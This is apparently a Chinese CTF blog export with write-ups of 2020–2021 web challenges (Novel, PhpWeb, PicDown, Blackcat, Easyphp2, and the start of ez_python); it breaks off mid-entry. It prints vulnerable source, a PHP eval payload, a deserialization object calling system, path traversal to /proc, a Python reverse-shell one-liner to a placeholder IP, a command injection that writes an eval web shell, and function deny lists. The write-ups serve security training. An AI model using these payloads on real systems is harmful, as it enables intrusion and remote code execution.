    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">_create</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$_content</span><span class="token operator">=</span><span class="token string">'&lt;?php $_GET["password"]==="'</span><span class="token punctuation">.</span><span class="token variable">$password</span><span class="token punctuation">.</span><span class="token string">'"?print("'</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">.</span><span class="token string">'"):exit(); '</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$_content</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">random_code</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">,</span><span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$code</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">,</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$count</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token variable">$code</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>阅读代码可以发现，程序首先将<code>$filename</code>拼接到<code>profile/</code>，然后检测文件是否存在，若存在，将文件内容读出来进行html编码，然后生成一个随机的字符串作为读取文件内容的密码，之后调用<code>_create()</code>函数，将密码和html编码后的文件内容，拼接到<code>'&lt;?php $_GET["password"]==="'.$password.'"?print("'.$content.'"):exit(); '</code>里，之后调用<code>_write()</code>函数，将上面这段php代码写进<code>private</code>目录，然后对文件内容内容进行正则表达式的检测，若通过检测,将文件内容写进<code>$dest</code>，并复制一份到<code>$f2</code>，若没有通过检测，则在<code>$dest</code>中写入<code>&lt;?php exit(); ?&gt;</code>。</p>
<p>理清程序大体流程后，大致的攻击思路就是上传一个txt的文件，然后再通过back生成php文件，开始尝试使用<code>"?&gt;</code>闭合前面，但是不能成功，<code>htmlspecialchars()</code>会将双引号和尖括号编码，之后采用复杂语法，<code>{${phpinfo()}}</code>进行rce。</p>
<p>上传3.txt</p>
<pre><code>${eval($_GET[0])}</code></pre>
<p><img src="/2021/08/26/wang-ding-bei-2020-novel/image-20210824025929370.png" alt="image-20210824025929370"></p>
<pre><code>private/KF2C2E85XJ.php?password=JRzPNLZz&amp;&amp;0=echo `cat /flag.txt`;</code></pre>
<p><img src="/2021/08/26/wang-ding-bei-2020-novel/image-20210824025838664.png" alt="image-20210824025838664"></p>
]]></content>
      <tags>
        <tag>backup</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯:2020-PhpWeb</title>
    <url>/2021/06/24/wang-ding-bei-2020-phpweb/</url>
    <content><![CDATA[<p>拦截抓包</p>
<p><img src="/2021/06/24/wang-ding-bei-2020-phpweb/image-20210625161138837.png" alt="image-20210625161138837"></p>
<p>发现可以传参：</p>
<pre class=" language-php"><code class="language-php">func<span class="token operator">=</span>file_get_contents<span class="token operator">&amp;</span>p<span class="token operator">=</span>index<span class="token punctuation">.</span>php</code></pre>
<p><img src="/2021/06/24/wang-ding-bei-2020-phpweb/image-20210625161300980.png" alt="image-20210625161300980"></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token variable">$disable_fun</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token string">"shell_exec"</span><span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">,</span><span class="token string">"passthru"</span><span class="token punctuation">,</span><span class="token string">"proc_open"</span><span class="token punctuation">,</span><span class="token string">"show_source"</span><span class="token punctuation">,</span><span class="token string">"phpinfo"</span><span class="token punctuation">,</span><span class="token string">"popen"</span><span class="token punctuation">,</span><span class="token string">"dl"</span><span class="token punctuation">,</span><span class="token string">"eval"</span><span class="token punctuation">,</span><span class="token string">"proc_terminate"</span><span class="token punctuation">,</span><span class="token string">"touch"</span><span class="token punctuation">,</span><span class="token string">"escapeshellcmd"</span><span class="token punctuation">,</span><span class="token string">"escapeshellarg"</span><span class="token punctuation">,</span><span class="token string">"assert"</span><span class="token punctuation">,</span><span class="token string">"substr_replace"</span><span class="token punctuation">,</span><span class="token string">"call_user_func_array"</span><span class="token punctuation">,</span><span class="token string">"call_user_func"</span><span class="token punctuation">,</span><span class="token string">"array_filter"</span><span class="token punctuation">,</span> <span class="token string">"array_walk"</span><span class="token punctuation">,</span>  <span class="token string">"array_map"</span><span class="token punctuation">,</span><span class="token string">"registregister_shutdown_function"</span><span class="token punctuation">,</span><span class="token string">"register_tick_function"</span><span class="token punctuation">,</span><span class="token string">"filter_var"</span><span class="token punctuation">,</span> <span class="token string">"filter_var_array"</span><span class="token punctuation">,</span> <span class="token string">"uasort"</span><span class="token punctuation">,</span> <span class="token string">"uksort"</span><span class="token punctuation">,</span> <span class="token string">"array_reduce"</span><span class="token punctuation">,</span><span class="token string">"array_walk"</span><span class="token punctuation">,</span> <span class="token string">"array_walk_recursive"</span><span class="token punctuation">,</span><span class="token string">"pcntl_exec"</span><span class="token punctuation">,</span><span class="token string">"fopen"</span><span class="token punctuation">,</span><span class="token string">"fwrite"</span><span class="token punctuation">,</span><span class="token string">"file_put_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string">"Y-m-d h:i:s a"</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string">"date"</span><span class="token punctuation">;</span>
        <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span> <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$func</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$disable_fun</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Hacker..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token delimiter">?></span></code></pre>
<pre><code>&lt;?php
class Test {
    var $p = "ls";
    var $func = "system";
    function __destruct() {
        if ($this-&gt;func != "") {
            echo gettime($this-&gt;func, $this-&gt;p);
        }
    }
}

$a=new Test();
echo serialize($a);
?&gt;</code></pre>
<p><img src="/2021/06/24/wang-ding-bei-2020-phpweb/2.png" alt="2"></p>
<p><img src="/2021/06/24/wang-ding-bei-2020-phpweb/1.png" alt="1"></p>
<p><img src="/2021/06/24/wang-ding-bei-2020-phpweb/image-20210625162346172.png" alt="image-20210625162346172"></p>
]]></content>
  </entry>
  <entry>
    <title>网鼎杯：2020-PicDown</title>
    <url>/2021/08/09/wang-ding-bei-2020-picdown/</url>
    <content><![CDATA[<h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p><img src="/2021/08/09/wang-ding-bei-2020-picdown/1.png" alt="1"></p>
<p><img src="/2021/08/09/wang-ding-bei-2020-picdown/2.png" alt="2"></p>
<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><pre><code>../../../proc/self/cmdline</code></pre>
<p><img src="/2021/08/09/wang-ding-bei-2020-picdown/3.png" alt="3"></p>
<p>读取app.py</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response
<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template
<span class="token keyword">from</span> flask <span class="token keyword">import</span> request
<span class="token keyword">import</span> os
<span class="token keyword">import</span> urllib

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

SECRET_FILE <span class="token operator">=</span> <span class="token string">"/tmp/secret.txt"</span>
f <span class="token operator">=</span> open<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>
SECRET_KEY <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>


@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">)</span>


@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/page'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">page</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token operator">not</span> url<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
            value <span class="token operator">=</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
            response <span class="token operator">=</span> Response<span class="token punctuation">(</span>value<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'application/octet-stream'</span><span class="token punctuation">)</span>
            response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=beautiful.jpg'</span>
            <span class="token keyword">return</span> response
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            value <span class="token operator">=</span> <span class="token string">"HACK ERROR!"</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        value <span class="token operator">=</span> <span class="token string">"SOMETHING WRONG!"</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>value<span class="token punctuation">)</span>


@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/no_one_know_the_manager'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>SECRET_KEY<span class="token punctuation">)</span>
    <span class="token keyword">if</span> key <span class="token operator">==</span> SECRET_KEY<span class="token punctuation">:</span>
        shell <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">)</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>
        res <span class="token operator">=</span> <span class="token string">"ok"</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        res <span class="token operator">=</span> <span class="token string">"Wrong Key!"</span>

    <span class="token keyword">return</span> res


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span></code></pre>
<p>可以通过<code>/proc/pid/fd/</code>读取，这个目录包含了进程打开的每一个文件的链接</p>
<pre><code>?url=../../../../proc/self/fd/</code></pre>
<p><img src="/2021/08/09/wang-ding-bei-2020-picdown/image-20210812014224853.png" alt="image-20210812014224853"></p>
<pre><code>拿到了key：wRL9H3ipk/8xXW/+XaTjJb70gYCVjQrU80ezyLqKYrs=</code></pre>
<p>但是shell执行的命令不会返回，这里使用反弹shell的方式，在根目录下读取flag</p>
<p>在BUU新建一个小号，从basic分类开启一台靶机，ssh连接后执行<code>nc -lvp 7777</code></p>
<pre><code>python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('xx.xx.xx.xx',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</code></pre>
]]></content>
  </entry>
  <entry>
    <title>羊城杯:2020-Blackcat</title>
    <url>/2021/07/29/yang-cheng-bei-2020-blackcat/</url>
    <content><![CDATA[<p><img src="/2021/07/29/yang-cheng-bei-2020-blackcat/image-20210730005043654.png" alt="image-20210730005043654"></p>
<p><img src="/2021/07/29/yang-cheng-bei-2020-blackcat/image-20210730020359672.png" alt="image-20210730020359672"></p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Black-Cat-Sheriff'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'One-ear'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'谁！竟敢踩我一只耳的尾巴！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$clandestine</span> <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"clandestine"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'White-cat-monitor'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token variable">$clandestine</span> <span class="token operator">=</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'White-cat-monitor'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$clandestine</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token variable">$hh</span> <span class="token operator">=</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'One-ear'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$clandestine</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$hh</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Black-Cat-Sheriff'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">echo</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"nc"</span><span class="token punctuation">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'One-ear'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<h5 id="hash-hmac-—-使用-HMAC-方法生成带有密钥的哈希值"><a href="#hash-hmac-—-使用-HMAC-方法生成带有密钥的哈希值" class="headerlink" title="hash_hmac — 使用 HMAC 方法生成带有密钥的哈希值"></a>hash_hmac — 使用 HMAC 方法生成带有密钥的哈希值</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> <span class="token string">';env'</span><span class="token punctuation">,</span> <span class="token keyword">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<pre><code>Black-Cat-Sheriff=afd556602cf62addfe4132a81b2d62b9db1b6719f83e16cce13f51960f56791b&amp;One-ear=%3Benv&amp;White-cat-monitor[]=1a</code></pre>
]]></content>
  </entry>
  <entry>
    <title>羊城杯:2020-Easyphp2</title>
    <url>/2021/07/28/yang-cheng-bei-2020-easyphp2/</url>
    <content><![CDATA[<p><img src="/2021/07/28/yang-cheng-bei-2020-easyphp2/image-20210728193440265.png" alt="image-20210728193440265"></p>
<p><img src="/2021/07/28/yang-cheng-bei-2020-easyphp2/image-20210728225539347.png" alt="image-20210728225539347"></p>
<p>访问robots.txt</p>
<p><img src="/2021/07/28/yang-cheng-bei-2020-easyphp2/image-20210728225848765.png" alt="image-20210728225848765"></p>
<p>有个LFI，url两次编码绕过</p>
<pre><code>http://86e11d7e-91c7-42ce-bae1-4c2b80609516.node4.buuoj.cn?
file=php://filter/convert.%25%36%32ase64-encode/resource=GWHT.php</code></pre>
<p>解码得</p>
<pre class=" language-php"><code class="language-php">    <span class="token delimiter">&lt;?php</span>
    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'max_execution_time'</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">'PASS'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'pass'</span><span class="token punctuation">,</span> <span class="token string">'PASS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'&lt;h2>'</span><span class="token punctuation">.</span><span class="token string">'&lt;hacker>'</span><span class="token punctuation">.</span><span class="token string">'&lt;h2>'</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">.</span><span class="token string">'&lt;h1>'</span><span class="token punctuation">.</span><span class="token string">'404'</span><span class="token punctuation">.</span><span class="token string">'&lt;h1>'</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">.</span><span class="token string">'Sorry, only people from GWHT are allowed to access this website.'</span><span class="token punctuation">.</span><span class="token string">'23333'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token delimiter">?></span>

    <span class="token delimiter">&lt;?php</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"count"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"count"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/;|base64|rot13|base32|base16|&lt;\?php|#/i'</span><span class="token punctuation">,</span> <span class="token variable">$count</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">echo</span> <span class="token string">"&lt;h2>The Count is: "</span> <span class="token punctuation">.</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'printf \''</span> <span class="token punctuation">.</span> <span class="token variable">$count</span> <span class="token punctuation">.</span> <span class="token string">'\' | wc -c'</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/h2>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token delimiter">?></span></code></pre>
<p>同理,check.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token string">"GWHT"</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// Cookie password.</span>
<span class="token keyword">echo</span> <span class="token string">"Here is nothing, isn't it ?"</span><span class="token punctuation">;</span>

<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre><code>/?file=GWHT.php&amp;count='|echo+"&lt;%3f%3d+eval(\$_POST['shell'])%3f&gt;"+&gt;+a.php' </code></pre>
<p>burp修改password为GWHT</p>
<p><img src="/2021/07/28/yang-cheng-bei-2020-easyphp2/image-20210728231048152.png" alt="image-20210728231048152"></p>
<p>蚁剑连接</p>
<p>/GWHT/system/of/a/down/flag.txt</p>
<p><img src="/2021/07/28/yang-cheng-bei-2020-easyphp2/image-20210728231450387.png" alt="image-20210728231450387"></p>
<p>权限问题读不了</p>
<p>README里面有个hash</p>
<p><img src="/2021/07/28/yang-cheng-bei-2020-easyphp2/image-20210728231515551.png" alt="image-20210728231515551"></p>
<p>解密后为GWHTCTF</p>
<p>printf “GWHTCTF” | su - GWHT -c ‘cat /GWHT/system/of/a/down/flag.txt’</p>
<p><img src="/2021/07/28/yang-cheng-bei-2020-easyphp2/image-20210728231538925.png" alt="image-20210728231538925"></p>
]]></content>
  </entry>
  <entry>
    <title>长城杯2021</title>
    <url>/2021/09/25/chang-cheng-bei-2021/</url>
    <content><![CDATA[<h2 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h2><h5 id="app-py"><a href="#app-py" class="headerlink" title="app.py"></a>app.py</h5><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> base64
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request
<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>send_from_directory
<span class="token keyword">import</span> os
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> random
<span class="token keyword">from</span> flask <span class="token keyword">import</span> send_file

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>age<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
        self<span class="token punctuation">.</span>age <span class="token operator">=</span> age

<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> b<span class="token string">'R'</span> <span class="token keyword">in</span> s<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span>
    <span class="token keyword">return</span> <span class="token number">1</span>


@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        user <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> check<span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">:</span>
            user <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>user<span class="token punctuation">)</span>
            username <span class="token operator">=</span> user<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            username <span class="token operator">=</span> <span class="token string">"bad,bad,hacker"</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> <span class="token string">"CTFer"</span> 
